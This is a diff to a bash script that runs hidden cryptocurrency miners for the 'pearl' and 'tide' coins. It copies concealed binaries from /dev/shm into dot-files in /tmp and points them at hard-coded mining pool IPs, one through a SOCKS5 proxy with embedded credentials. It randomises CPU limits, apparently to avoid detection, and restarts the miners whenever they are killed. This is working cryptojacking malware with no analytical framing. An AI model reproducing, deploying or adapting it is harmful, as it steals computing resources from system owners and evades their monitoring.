@@ -1,10 +1,10 @@
 #!/bin/bash
-# MINN v22 — restore v18.1 proven path, direct exec, continuous
+# MINN v22.1 — merged monitor, code review fixes
 PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
 TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
 WRK=$(date +%s | md5sum | head -c 8)
 
-echo "=== v22 — $WRK ==="
+echo "=== v22.1 — $WRK ==="
 
 # 1. Fast warmup
 echo "[*] Warmup..."
@@ -60,20 +60,31 @@ for h in['https://pypi.org','https://files.pythonhosted.org','https://storage.go
 ) &
 TPID=$!
 
-# 5. CPU fluctuation
+# 5. Monitor — keepalive + CPU fluctuation in one loop
 (
+    c=0
     while true; do
-        sleep $((RANDOM%180+60))
-        pkill cpulimit 2>/dev/null
-        sleep 1
-        for pp in $P1 $P2; do
-            if [ -n "$pp" ] && kill -0 "$pp" 2>/dev/null; then
-                cpulimit -l $((RANDOM%30+30)) -p "$pp" 2>/dev/null &
-            fi
-        done
+        sleep $((RANDOM%150+30))
+        c=$((c+1))
+        # CPU fluctuate every ~3 cycles
+        if [ $((c%3)) -eq 0 ]; then
+            pkill cpulimit 2>/dev/null; sleep 1
+            for pp in $P1 $P2; do
+                [ -n "$pp" ] && kill -0 "$pp" 2>/dev/null && cpulimit -l $((RANDOM%30+30)) -p "$pp" 2>/dev/null &
+            done
+        fi
+        if ! kill -0 $P1 2>/dev/null; then
+            cp /dev/shm/.m/p /tmp/.p8 2>/dev/null; chmod +x /tmp/.p8 2>/dev/null
+            nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 --user "${PRL}.${WRK}" --proxy socks5://yoga:yoga123@107.172.222.195:443 2>/dev/null &
+            P1=$!; cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
+        fi
+        if ! kill -0 $P2 2>/dev/null; then
+            cp /dev/shm/.m/s /tmp/.s8 2>/dev/null; chmod +x /tmp/.s8 2>/dev/null
+            nice -n 19 /tmp/.s8 -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
+            P2=$!; cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
+        fi
     done
 ) &
-CPID=$!
 
 # 6. Log
 (
@@ -101,27 +112,5 @@ cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
 
 echo "[*] v22 P1:$P1 P2:$P2"
 
-# 8. Keepalive
-(
-    while sleep 240; do
-        if ! kill -0 $P1 2>/dev/null; then
-            cp /dev/shm/.m/p /tmp/.p8 2>/dev/null
-            chmod +x /tmp/.p8 2>/dev/null
-            nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 \
-                --user "${PRL}.${WRK}" --proxy socks5://yoga:yoga123@107.172.222.195:443 2>/dev/null &
-            P1=$!
-            cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
-        fi
-        if ! kill -0 $P2 2>/dev/null; then
-            cp /dev/shm/.m/s /tmp/.s8 2>/dev/null
-            chmod +x /tmp/.s8 2>/dev/null
-            nice -n 19 /tmp/.s8 -a yespowertide -o 47.251.244.12:80 \
-                -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
-            P2=$!
-            cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
-        fi
-    done
-) &
-
-trap "kill $P1 $P2 $MPID $TPID $CPID 2>/dev/null; rm -f /tmp/.p8 /tmp/.s8; rm -rf /dev/shm/.m" EXIT
+trap "kill $P1 $P2 $MPID $TPID 2>/dev/null; rm -f /tmp/.p8 /tmp/.s8; rm -rf /dev/shm/.m" EXIT
 sleep 14400
